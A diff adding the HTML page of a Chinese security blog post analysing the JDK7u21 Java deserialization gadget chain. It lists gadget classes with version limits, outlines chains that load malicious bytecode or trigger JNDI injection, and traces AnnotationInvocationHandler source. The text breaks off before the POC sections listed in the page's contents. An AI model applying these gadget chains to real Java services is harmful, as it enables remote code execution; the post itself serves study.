@@ -1,0 +1,849 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    JAVA反序列化-JDK7u21原生反序列化 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="[TOC] Java的反序列化漏洞有一些时基于第三方jar包的，所以我们不难免会设想是否存在不依赖第三方的Gadget。比如这条JDK7u21的链子，不需要任何其他的jar包。 没有CC依赖，那之前的InvokerTransformer，chainedTransformer，LazyMap等都不能使用了。 其实学习这个链就是主要学习它的思路，毕竟这么老的链实战中怎么可能用到 该文摘自bfengj师">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JAVA反序列化-JDK7u21原生反序列化">
+<meta property="og:url" content="http://example.com/2025/09/30/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="[TOC] Java的反序列化漏洞有一些时基于第三方jar包的，所以我们不难免会设想是否存在不依赖第三方的Gadget。比如这条JDK7u21的链子，不需要任何其他的jar包。 没有CC依赖，那之前的InvokerTransformer，chainedTransformer，LazyMap等都不能使用了。 其实学习这个链就是主要学习它的思路，毕竟这么老的链实战中怎么可能用到 该文摘自bfengj师">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-09-30T03:01:22.000Z">
+<meta property="article:modified_time" content="2026-01-04T15:35:08.895Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="JAVA安全">
+<meta property="article:tag" content="JAVA反序列化">
+<meta property="article:tag" content="JDK原生反序列化">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="JAVA反序列化-JDK7u21原生反序列化">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">JAVA反序列化-JDK7u21原生反序列化</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8jdk%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E8%83%BD%E5%88%A9%E7%94%A8%E7%9A%84%E7%B1%BB"><span class="toc-number">1.</span> <span class="toc-text"> 在JDK原生反序列化中能利用的类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%BB%84%E5%90%88%E6%8A%80"><span class="toc-number">2.</span> <span class="toc-text"> 常用组合技</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E9%93%BE-1%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">2.1.</span> <span class="toc-text"> 模板链 1（加载字节码执行）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E9%93%BE-2jndi-%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.</span> <span class="toc-text"> 模板链 2（JNDI 注入）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E9%93%BE-3%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86"><span class="toc-number">2.3.</span> <span class="toc-text"> 模板链 3（动态代理）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%9D%E8%B5%96"><span class="toc-number">3.</span> <span class="toc-text"> 依赖</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text"> 分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%BEequals"><span class="toc-number">4.1.</span> <span class="toc-text"> 找equals</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hash%E5%80%BC%E6%9E%84%E9%80%A0"><span class="toc-number">4.2.</span> <span class="toc-text"> hash值构造</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0"><span class="toc-number">5.</span> <span class="toc-text"> 构造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E9%93%BE%E6%B5%81%E7%A8%8B"><span class="toc-number">6.</span> <span class="toc-text"> 总链流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BBpoc"><span class="toc-number">7.</span> <span class="toc-text"> 总POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#poc2"><span class="toc-number">8.</span> <span class="toc-text"> POC2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%88%98poc"><span class="toc-number">9.</span> <span class="toc-text"> 实战POC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload1"><span class="toc-number">9.1.</span> <span class="toc-text"> payload1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload2"><span class="toc-number">9.2.</span> <span class="toc-text"> payload2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-number">10.</span> <span class="toc-text"> 修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8u20%E9%93%BE"><span class="toc-number">11.</span> <span class="toc-text"> 8u20链</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-JAVA反序列化-JDK7u21原生反序列化" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/09/30/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-09-30T03:01:22.000Z" itemprop="datePublished">2025-09-30</time>
+    <time style="display: none;" id="post-update-time">2026-01-04</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9/" data-aos="zoom-in">知识点</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p>[TOC]</p>
+<p>Java的反序列化漏洞有一些时基于第三方jar包的，所以我们不难免会设想是否存在不依赖第三方的Gadget。比如这条JDK7u21的链子，不需要任何其他的jar包。</p>
+<p>没有CC依赖，那之前的InvokerTransformer，chainedTransformer，LazyMap等都不能使用了。</p>
+<p>其实学习这个链就是主要学习它的思路，毕竟这么老的链实战中怎么可能用到</p>
+<p>该文摘自<strong>bfengj</strong>师傅的<a target="_blank" rel="noopener" href="https://github.com/bfengj/CTF/blob/main/Web/java/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%5BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%5DJDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%A6%E4%B9%A0.md">Java反序列化]JDK7u21反序列化链学习.md at main · bfengj/CTF</a>，师傅讲得太好了</p>
+<h2 id="在jdk原生反序列化中能利用的类"><a class="markdownIt-Anchor" href="#在jdk原生反序列化中能利用的类"></a> 在JDK原生反序列化中能利用的类</h2>
+<p>① <code>BadAttributeValueExpException</code> 系列</p>
+<p><strong>触发方法</strong>：<code>readObject()</code> → 调用 <code>toString()</code></p>
+<p><strong>可用版本</strong>：</p>
+<ul>
+<li>JDK 8u76 之前直接可用。</li>
+<li>新版本可用代理类或可序列化对象绕过。</li>
+</ul>
+<hr />
+<p>② <code>TemplatesImpl</code></p>
+<p><strong>触发方法</strong>：<code>newTransformer()</code></p>
+<p><strong>可用版本</strong>：</p>
+<ul>
+<li>JDK 8u251 前基本可用，之后需绕过模块封装限制。</li>
+</ul>
+<hr />
+<p>③ <code>AnnotationInvocationHandler</code></p>
+<p><strong>触发方法</strong>：<code>readObject()</code> → 代理对象方法调用</p>
+<p><strong>可用版本</strong>：</p>
+<ul>
+<li>JDK 8u71 前可直接用，之后受限制，但在同模块可用</li>
+</ul>
+<hr />
+<p>④ <code>BeanContextSupport</code> / <code>BeanContextServicesSupport</code></p>
+<p><strong>触发方法</strong>：<code>readObject()</code> → 自动添加成员</p>
+<p><strong>利用点</strong>：</p>
+<ul>
+<li>在反序列化时会调用 <code>initialize()</code>, <code>readChildren()</code> 等。</li>
+<li>可用来调用任意方法（Jdk7u21 链）</li>
+</ul>
+<hr />
+<p>⑤ <code>PriorityQueue</code></p>
+<p><strong>触发方法</strong>：<code>readObject()</code> → 调用 <code>heapify()</code> → <code>siftDown()</code> → <code>compare()</code></p>
+<p><strong>可用版本</strong>：</p>
+<ul>
+<li>一直存在，但 comparator 类必须可用</li>
+</ul>
+<hr />
+<p>⑥ <code>HashMap</code> / <code>Hashtable</code></p>
+<p><strong>触发方法</strong>：<code>readObject()</code> → <code>put()</code> → 调用 key 的 <code>hashCode()</code> 或 value 的 <code>equals()</code></p>
+<hr />
+<p>⑦ <code>java.rmi.server.UnicastRef</code> / <code>UnicastRef2</code></p>
+<p><strong>触发方法</strong>：<code>readObject()</code> → RMI 远程调用</p>
+<p><strong>利用点</strong>：</p>
+<ul>
+<li>可发起远程连接（配合 JNDI 注入）。</li>
+</ul>
+<p><strong>版本要求</strong>：</p>
+<ul>
+<li>JDK 8u121 前 RMI 注入链可用</li>
+</ul>
+<hr />
+<p>⑧ <code>JdbcRowSetImpl</code></p>
+<p><strong>触发方法</strong>：<code>readObject()</code> → <code>connect()</code> → <code>setDataSourceName()</code> → JNDI lookup</p>
+<p><strong>版本要求</strong>：</p>
+<ul>
+<li>JDK 8u181 前默认可打，之后 JNDI 限制变严</li>
+</ul>
+<hr />
+<h2 id="常用组合技"><a class="markdownIt-Anchor" href="#常用组合技"></a> 常用组合技</h2>
+<h3 id="模板链-1加载字节码执行"><a class="markdownIt-Anchor" href="#模板链-1加载字节码执行"></a> <strong>模板链 1</strong>（加载字节码执行）</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue → TemplatesImpl</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>PriorityQueue</code> 反序列化时触发 <code>compare()</code> → 调用 <code>TemplatesImpl.newTransformer()</code> → 加载恶意类。</li>
+</ul>
+<h3 id="模板链-2jndi-注入"><a class="markdownIt-Anchor" href="#模板链-2jndi-注入"></a> <strong>模板链 2</strong>（JNDI 注入）</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException → JdbcRowSetImpl</span><br></pre></td></tr></table></figure>
+<ul>
+<li>反序列化触发 <code>toString()</code> → 调用 <code>JdbcRowSetImpl.connect()</code> → 触发 JNDI。</li>
+</ul>
+<h3 id="模板链-3动态代理"><a class="markdownIt-Anchor" href="#模板链-3动态代理"></a> <strong>模板链 3</strong>（动态代理）</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler → Map(TemplatesImpl)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>动态代理触发方法 → 调用目标对象方法 → 执行恶意类。</li>
+</ul>
+<h2 id="依赖"><a class="markdownIt-Anchor" href="#依赖"></a> 依赖</h2>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>7<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>7<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.20.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里JDK的版本需要小于等于7u21</p>
+<h2 id="分析"><a class="markdownIt-Anchor" href="#分析"></a> 分析</h2>
+<p>7u21这条链核心就在于**<code>AnnotationInvocationHandler</code>**这个类。联想到CC1的时候第一次接触它，这个类有两种利用思路，一种是利用它的<code>readObject()</code>，另一种就是利用它的<code>invoke</code>，因为<code>AnnotationInvocationHandler</code>是一个实现了<code>InvocationHandler</code>接口的类，可以应用于动态代理中。</p>
+<p>在<code>invoke</code>方法中，如果传入的方法名是<code>equals</code>而且方法的参数列表只有一个<code>Object</code>对象的时候，就可以进入<code>equalsImpl()</code>方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">var4</span> <span class="operator">=</span> var2.getName();</span><br><span class="line">    Class[] var5 = var2.getParameterTypes();</span><br><span class="line">    <span class="keyword">if</span> (var4.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; var5.length == <span class="number">1</span> &amp;&amp; var5[<span class="number">0</span>] == Object.class) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.equalsImpl(var3[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>
+<p>再跟进这个<code>equalsImpl()</code>方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Boolean <span class="title function_">equalsImpl</span><span class="params">(Object var1)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (var1 == <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">this</span>.type.isInstance(var1)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Method[] var2 = <span class="built_in">this</span>.getMemberMethods();<span class="comment">//获取所有方法</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">var3</span> <span class="operator">=</span> var2.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="number">0</span>; var4 &lt; var3; ++var4) &#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">var5</span> <span class="operator">=</span> var2[var4];</span><br><span class="line">            <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> var5.getName();</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var7</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.get(var6);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="type">AnnotationInvocationHandler</span> <span class="variable">var9</span> <span class="operator">=</span> <span class="built_in">this</span>.asOneOfUs(var1);</span><br><span class="line">            <span class="keyword">if</span> (var9 != <span class="literal">null</span>) &#123;</span><br><span class="line">                var8 = var9.memberValues.get(var6);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var8 = var5.invoke(var1);<span class="comment">//执行方法的地方</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (InvocationTargetException var11) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IllegalAccessException var12) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(var12);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!memberValueEquals(var7, var8)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>前两个if不用管，直接看else。通过<code>getMemberMethods</code>得到一个<code>Method[]</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Method[] getMemberMethods() &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.memberMethods == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.memberMethods = (Method[])AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Method[]&gt;() &#123;</span><br><span class="line">            <span class="keyword">public</span> Method[] run() &#123;</span><br><span class="line">                Method[] var1 = AnnotationInvocationHandler.<span class="built_in">this</span>.type.getDeclaredMethods();</span><br><span class="line">                AccessibleObject.setAccessible(var1, <span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">return</span> var1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.memberMethods;</span><br></pre></td></tr></table></figure>
+<p>然后进入for循环，遍历这个<code>Method[]</code>，然后调用方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (var9 != <span class="literal">null</span>) &#123;</span><br><span class="line">    var8 = var9.memberValues.get(var6);</span><br></pre></td></tr></table></figure>
+<p>这里的<code>Method[]</code>只能是通过<code>this.type</code>来得到：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.<span class="built_in">this</span>.type.getDeclaredMethods();</span><br></pre></td></tr></table></figure>
+<p>因为<code>memberMethods</code>属性是个瞬态属性不可控。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="keyword">volatile</span> Method[] memberMethods = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>
+<p>因此总的来说<code>equalsImpl</code>方法的作用就是得到<code>this.type</code>的所有<code>Method[]</code>，然后依次调用所有。如果让<code>this.type</code>是<code>TemplatesImpl</code>的类的话，就自然会调用到<code>newTransformer</code>或者<code>getOutputProperties</code>。</p>
+<p>而<code>invoke</code>的那个参数var1也就是调用方法的对象了，所以var1需要是我们构造的恶意的<code>TemplatesImpl</code>对象。</p>
+<p>至此后面的部分就稍微有点理清了，但是关键是，哪里有合适的<code>equals</code>可以触发。</p>
+<h3 id="找equals"><a class="markdownIt-Anchor" href="#找equals"></a> 找equals</h3>
+<p><code>equals</code>通常用于比较两个对象是否相同</p>
+<p><code>HashSet</code>是基于<code>HashMap</code>来实现的一个集合，是一个不允许有重复元素的集合，既然它都不允许重复，那么在添加对象的时候，就一定会涉及到比较操作，而它比较的方法，就是将对象保存在<code>HashMap</code>的<code>key</code>处来去重，看看代码：</p>
